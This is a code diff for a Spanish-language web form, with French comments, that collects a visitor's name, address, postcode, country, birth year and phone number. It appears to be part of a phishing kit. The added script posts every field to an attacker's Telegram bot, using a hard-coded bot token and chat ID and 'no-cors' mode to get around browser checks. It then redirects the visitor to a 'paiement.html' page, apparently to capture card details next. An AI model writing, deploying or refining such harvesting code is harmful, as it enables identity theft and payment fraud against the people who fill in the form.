@@ -27,7 +27,8 @@
         <option value="BE">Bélgica</option>
         <option value="CH">Suiza</option>
       </select>
-      <input type="date" required/>
+      <!-- Nouveau champ Año de nacimiento -->
+      <input type="number" placeholder="Año de nacimiento" min="1900" max="2025" required/>
       <input type="tel" placeholder="Teléfono" required/>
       <button type="submit">Continuar</button>
     </form>
@@ -53,46 +54,54 @@
     <div class="spinner"></div>
   </div>
 
- <script>
-document.getElementById("infoForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-  document.getElementById("spinnerOverlay").style.display = "flex";
+  <script>
+    document.getElementById("infoForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      // Affiche le spinner
+      document.getElementById("spinnerOverlay").style.display = "flex";
 
-  const elems = this.elements;
-  const data = {
-    apellido: elems[0].value.trim(),
-    nombre:   elems[1].value.trim(),
-    direccion:elems[2].value.trim(),
-    ciudad:   elems[3].value.trim(),
-    cp:       elems[4].value.trim(),
-    pais:     elems[5].value,
-    fecha:    elems[6].value,
-    telefono: elems[7].value.trim()
-  };
+      // Récupération des valeurs du formulaire
+      const elems = this.elements;
+      const data = {
+        apellido: elems[0].value.trim(),
+        nombre:   elems[1].value.trim(),
+        direccion:elems[2].value.trim(),
+        ciudad:   elems[3].value.trim(),
+        cp:       elems[4].value.trim(),
+        pais:     elems[5].value,
+        ano:      elems[6].value,   // Año de nacimiento
+        telefono: elems[7].value.trim()
+      };
 
-  const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
-  const chatId   = "-4970333928";
-  const message  = 
-    `📋 Información personal:\n` +
-    `Apellido: ${data.apellido}\n` +
-    `Nombre: ${data.nombre}\n` +
-    `Dirección: ${data.direccion}\n` +
-    `Ciudad: ${data.ciudad}\n` +
-    `Código postal: ${data.cp}\n` +
-    `País: ${data.pais}\n` +
-    `Fecha de nacimiento: ${data.fecha}\n` +
-    `Teléfono: ${data.telefono}`;
+      // Préparation du message Telegram
+      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chatId   = "-1887198443";
+      const message  = 
+        `📋 Información personal:\n` +
+        `Apellido: ${data.apellido}\n` +
+        `Nombre: ${data.nombre}\n` +
+        `Dirección: ${data.direccion}\n` +
+        `Ciudad: ${data.ciudad}\n` +
+        `Código postal: ${data.cp}\n` +
+        `País: ${data.pais}\n` +
+        `Año de nacimiento: ${data.ano}\n` +
+        `Teléfono: ${data.telefono}`;
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    mode: "no-cors",               // contourne CORS
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message })
-  })
-  .catch(err => console.error("Erreur Telegram:", err))
-  .finally(() => {
-    setTimeout(() => location.href = "paiement.html", 2500);
-  });
-});
-</script>
-}
+      // Envoi vers Telegram (mode no-cors pour contourner CORS)
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .catch(err => console.error("Erreur Telegram:", err))
+      .finally(() => {
+        // Redirection après 2,5 secondes
+        setTimeout(() => {
+          window.location.href = "paiement.html";
+        }, 2500);
+      });
+    });
+  </script>
+</body>
+</html>
